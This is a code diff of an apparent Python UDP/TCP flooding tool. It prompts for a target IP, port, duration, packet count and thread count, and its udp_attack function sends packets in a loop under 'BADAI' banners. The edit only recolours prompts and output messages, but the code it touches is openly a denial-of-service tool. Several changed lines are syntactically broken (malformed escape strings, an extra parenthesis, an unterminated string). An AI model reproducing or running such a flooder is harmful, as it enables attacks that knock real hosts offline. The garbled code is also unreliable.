@@ -48,14 +48,14 @@ def display_header():
 
 # Prompt user for input
 def get_user_input():
-    print("\033[33m+======================================================\033[0m")
-    target_ip = input(  | Target IP : \033[0m").strip()
-    target_port = input("\033[31m | Target Port : \033[0m").strip()
-    attack_time = input("\033[33m | Time (seconds) : \033[0m").strip()
-    packet = input("\033[33m | Packet : \033[0m").strip()
-    thread_count = input("\033[33m | Thread : \033[0m").strip()
-    method = input("\032[1m | Method (UDP/TCP & UDP Mix) : \033[0m").strip().lower()
-    print("\033[33m=======================================================\033[0m")
+    print('e\1;35+======================================================\033[0m')
+    target_ip = input('\e[1;36m | Target IP : \033[0m').strip()
+    target_port = input('\e[1;36 | Target Port : \033[0m').strip()
+    attack_time = input('\e[1;36 | Time (seconds) : \033[0m').strip()
+    packet = input('\e[1;36 | Packet : \033[0m').strip()
+    thread_count = input('\e[1;36 | Thread : \033[0m').strip()
+    method = input('\e[1;36 | Method (UDP/TCP & UDP Mix) : \033[0m').strip().lower()
+    print(('e\1;35=======================================================\033[0m')
 
     return target_ip, int(target_port), int(attack_time), int(packet), int(thread_count), method
 
@@ -81,8 +81,8 @@ def udp_attack(ip, port, packet, duration, thread_count):
         try:
             for _ in range(packet):
                 s.sendto(data, (ip, port))
-            print(f"  \033[92mBADAI AL-AQSHA   \033[97mSent packet:. " +ip+ "\033[0m" )
-            print(f"  \033[31mBADAI AL-AQSHA   \033[33mSent packet:. " +ip+ "\033[0m" )
+            print(f"  \e[0;36m:: \e[0;30mBADAI GURUN \e[0;31m= \e[0;33mUDP \e[0;37m' " +ip+ "\033[0m" )
+            print(f"  \e[1;31m:: \e[0;33mBADAI GURUN \e[0;31m= \e[0;30mUDP \e[0;37m' " +ip+ "\033[0m" )
             print(f"  \033[95mBADAI AL-AQSHA   \033[91mSent packet:. " +ip+ "\033[0m" )
         except socket.error:
             s.close()
